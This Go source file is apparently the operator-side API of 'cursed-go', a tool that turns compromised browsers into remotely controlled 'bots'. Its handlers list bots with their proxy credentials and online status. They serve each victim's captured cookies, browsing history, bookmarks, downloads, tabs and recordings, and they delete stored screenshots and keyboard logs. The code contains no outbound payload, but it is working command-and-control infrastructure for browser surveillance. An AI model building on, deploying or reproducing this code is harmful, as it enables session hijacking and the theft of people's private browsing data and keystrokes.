package api

import (
	"errors"
	"net/http"
	"strconv"

	"github.com/go-chi/chi/v5"
	"github.com/google/uuid"
	"gorm.io/gorm"

	"github.com/s045pd/cursed-go/internal/db/models"
)

// BotsAPI groups bot management routes (no RPC needed).
type BotsAPI struct {
	DB *gorm.DB
}

// botSummary mirrors the Node.js bot list payload shape.
//
// IMPORTANT: tabs and history are returned as COUNTS (int), not arrays —
// matches the original Node SQL using json_array_length(). The Vue GUI
// renders `Tabs[{{ info.tabs }}]` and expects a number; if we returned
// the full array the button label would render the entire JSON. The
// full arrays are still available via /api/v1/fields?field=tabs|history.
//
// createdAt is also exposed because the GUI's "first seen" badge uses
// `info.createdAt | moment(...)`.
type botSummary struct {
	ID              uuid.UUID      `json:"id"`
	Name            string         `json:"name"`
	BrowserID       string         `json:"browser_id"`
	IsOnline        bool           `json:"is_online"`
	LastOnline      string         `json:"last_online"`
	LastActiveAt    string         `json:"last_active_at,omitempty"`
	CreatedAt       string         `json:"createdAt"`
	ProxyUsername   string         `json:"proxy_username"`
	ProxyPassword   string         `json:"proxy_password"`
	State           string         `json:"state"`
	UserAgent       string         `json:"user_agent"`
	CurrentTab      models.JSONMap `json:"current_tab"`
	CurrentTabImage string         `json:"current_tab_image"`
	Tabs            int            `json:"tabs"`
	History         int            `json:"history"`
	SwitchConfig    models.JSONMap `json:"switch_config"`
	DataConfig      models.JSONMap `json:"data_config"`
}

func botToSummary(b *models.Bot) botSummary {
	last := ""
	if b.LastActiveAt != nil {
		last = b.LastActiveAt.UTC().Format("2006-01-02T15:04:05.000Z")
	}
	ct := b.CurrentTab
	if ct == nil {
		ct = models.JSONMap{}
	}
	return botSummary{
		ID:              b.ID,
		Name:            b.Name,
		BrowserID:       b.BrowserID,
		IsOnline:        b.IsOnline,
		LastOnline:      b.LastOnline.UTC().Format("2006-01-02T15:04:05.000Z"),
		LastActiveAt:    last,
		CreatedAt:       b.CreatedAt.UTC().Format("2006-01-02T15:04:05.000Z"),
		ProxyUsername:   b.ProxyUsername,
		ProxyPassword:   b.ProxyPassword,
		State:           b.State,
		UserAgent:       b.UserAgent,
		CurrentTab:      ct,
		CurrentTabImage: b.CurrentTabImage,
		Tabs:            len(b.Tabs),
		History:         len(b.History),
		SwitchConfig:    b.SwitchConfig,
		DataConfig:      b.DataConfig,
	}
}

// List is GET /api/v1/bots?page=&limit=&name=&is_online=&state=
func (a *BotsAPI) List(w http.ResponseWriter, r *http.Request) {
	q := r.URL.Query()
	page, _ := strconv.Atoi(q.Get("page"))
	if page < 1 {
		page = 1
	}
	limit, _ := strconv.Atoi(q.Get("limit"))
	if limit < 1 || limit > 200 {
		limit = 50
	}
	offset := (page - 1) * limit

	tx := a.DB.Model(&models.Bot{})
	if v := q.Get("name"); v != "" {
		tx = tx.Where("name LIKE ?", "%"+v+"%")
	}
	if v := q.Get("is_online"); v != "" {
		tx = tx.Where("is_online = ?", v == "true")
	}
	if v := q.Get("state"); v != "" {
		tx = tx.Where("state = ?", v)
	}

	var total int64
	if err := tx.Count(&total).Error; err != nil {
		JSONErr(w, http.StatusInternalServerError, "count failed")
		return
	}
	var rows []models.Bot
	// Sequelize created the column as "createdAt" (camelCase, double-quoted in
	// the original DDL). Postgres folds unquoted identifiers to lowercase, so
	// we must keep the quotes here.
	if err := tx.Order(`"createdAt" DESC`).Limit(limit).Offset(offset).Find(&rows).Error; err != nil {
		JSONErr(w, http.StatusInternalServerError, "list failed")
		return
	}
	out := make([]botSummary, 0, len(rows))
	for i := range rows {
		out = append(out, botToSummary(&rows[i]))
	}

	JSONOK(w, map[string]any{
		"bots": out,
		"pagination": map[string]any{
			"total":      total,
			"page":       page,
			"limit":      limit,
			"totalPages": (total + int64(limit) - 1) / int64(limit),
		},
	})
}

type updateBotReq struct {
	BotID         string         `json:"bot_id"`
	Name          *string        `json:"name,omitempty"`
	ProxyUsername *string        `json:"proxy_username,omitempty"`
	ProxyPassword *string        `json:"proxy_password,omitempty"`
	SwitchConfig  map[string]any `json:"switch_config,omitempty"`
	DataConfig    map[string]any `json:"data_config,omitempty"`
}

// Update is PUT /api/v1/bots
func (a *BotsAPI) Update(w http.ResponseWriter, r *http.Request) {
	var body updateBotReq
	if !MustDecode(w, r, &body) {
		return
	}
	id, err := uuid.Parse(body.BotID)
	if err != nil {
		JSONErr(w, http.StatusBadRequest, "invalid bot_id")
		return
	}
	updates := map[string]any{}
	if body.Name != nil {
		updates["name"] = *body.Name
	}
	if body.ProxyUsername != nil {
		updates["proxy_username"] = *body.ProxyUsername
	}
	if body.ProxyPassword != nil {
		updates["proxy_password"] = *body.ProxyPassword
	}
	if body.SwitchConfig != nil {
		updates["switch_config"] = models.JSONMap(body.SwitchConfig)
	}
	if body.DataConfig != nil {
		updates["data_config"] = models.JSONMap(body.DataConfig)
	}
	if len(updates) == 0 {
		JSONErr(w, http.StatusBadRequest, "no fields to update")
		return
	}
	res := a.DB.Model(&models.Bot{}).Where("id = ?", id).Updates(updates)
	if res.Error != nil {
		JSONErr(w, http.StatusInternalServerError, "update failed")
		return
	}
	if res.RowsAffected == 0 {
		JSONErr(w, http.StatusNotFound, "bot not found")
		return
	}
	JSONOK(w, struct{}{})
}

type deleteBotReq struct {
	BotID string `json:"bot_id"`
}

// Delete is DELETE /api/v1/bots
func (a *BotsAPI) Delete(w http.ResponseWriter, r *http.Request) {
	var body deleteBotReq
	if !MustDecode(w, r, &body) {
		return
	}
	id, err := uuid.Parse(body.BotID)
	if err != nil {
		JSONErr(w, http.StatusBadRequest, "invalid bot_id")
		return
	}
	if err := a.cascadeDelete(id); err != nil {
		JSONErr(w, http.StatusInternalServerError, "delete failed")
		return
	}
	JSONOK(w, struct{}{})
}

type batchDeleteReq struct {
	BotIDs []string `json:"bot_ids"`
}

// BatchDelete is POST /api/v1/bots/batch-delete
func (a *BotsAPI) BatchDelete(w http.ResponseWriter, r *http.Request) {
	var body batchDeleteReq
	if !MustDecode(w, r, &body) {
		return
	}
	if len(body.BotIDs) == 0 {
		JSONErr(w, http.StatusBadRequest, "bot_ids required")
		return
	}
	ids := make([]uuid.UUID, 0, len(body.BotIDs))
	for _, s := range body.BotIDs {
		id, err := uuid.Parse(s)
		if err != nil {
			JSONErr(w, http.StatusBadRequest, "invalid bot_id: "+s)
			return
		}
		ids = append(ids, id)
	}
	deleted := 0
	for _, id := range ids {
		if err := a.cascadeDelete(id); err == nil {
			deleted++
		}
	}
	JSONOK(w, map[string]any{"deletedCount": deleted})
}

func (a *BotsAPI) cascadeDelete(id uuid.UUID) error {
	return a.DB.Transaction(func(tx *gorm.DB) error {
		if err := tx.Where("bot_id = ?", id).Delete(&models.BotScreenshot{}).Error; err != nil {
			return err
		}
		if err := tx.Where("bot_id = ?", id).Delete(&models.BotKeyboardLog{}).Error; err != nil {
			return err
		}
		if err := tx.Where("bot = ?", id).Delete(&models.BotRecording{}).Error; err != nil {
			return err
		}
		if err := tx.Where("id = ?", id).Delete(&models.Bot{}).Error; err != nil {
			return err
		}
		return nil
	})
}

// Image is GET /api/v1/bots/image/{bot_id}
func (a *BotsAPI) Image(w http.ResponseWriter, r *http.Request) {
	idStr := chi.URLParam(r, "bot_id")
	id, err := uuid.Parse(idStr)
	if err != nil {
		JSONErr(w, http.StatusBadRequest, "invalid bot_id")
		return
	}
	var b models.Bot
	if err := a.DB.Where("id = ?", id).First(&b).Error; err != nil {
		if errors.Is(err, gorm.ErrRecordNotFound) {
			JSONErr(w, http.StatusNotFound, "bot not found")
			return
		}
		JSONErr(w, http.StatusInternalServerError, "lookup failed")
		return
	}
	w.Header().Set("Content-Type", "image/jpeg")
	_, _ = w.Write([]byte(b.CurrentTabImage))
}

// Field is GET /api/v1/fields?field=<name>&id=<bot_id>
func (a *BotsAPI) Field(w http.ResponseWriter, r *http.Request) {
	q := r.URL.Query()
	field := q.Get("field")
	idStr := q.Get("id")
	id, err := uuid.Parse(idStr)
	if err != nil {
		JSONErr(w, http.StatusBadRequest, "invalid id")
		return
	}
	allowed := map[string]string{
		"recording":  "recording",
		"tabs":       "tabs",
		"cookies":    "cookies",
		"history":    "history",
		"bookmarks":  "bookmarks",
		"downloads":  "downloads",
		"activity":   "activity",
	}
	col, ok := allowed[field]
	if !ok {
		JSONErr(w, http.StatusBadRequest, "field not allowed")
		return
	}
	var b models.Bot
	if err := a.DB.Select(col).Where("id = ?", id).First(&b).Error; err != nil {
		JSONErr(w, http.StatusNotFound, "bot not found")
		return
	}
	switch col {
	case "recording":
		JSONOK(w, b.Recording)
	case "tabs":
		JSONOK(w, b.Tabs)
	case "cookies":
		JSONOK(w, b.Cookies)
	case "history":
		JSONOK(w, b.History)
	case "bookmarks":
		JSONOK(w, b.Bookmarks)
	case "downloads":
		JSONOK(w, b.Downloads)
	case "activity":
		JSONOK(w, b.Activity)
	}
}
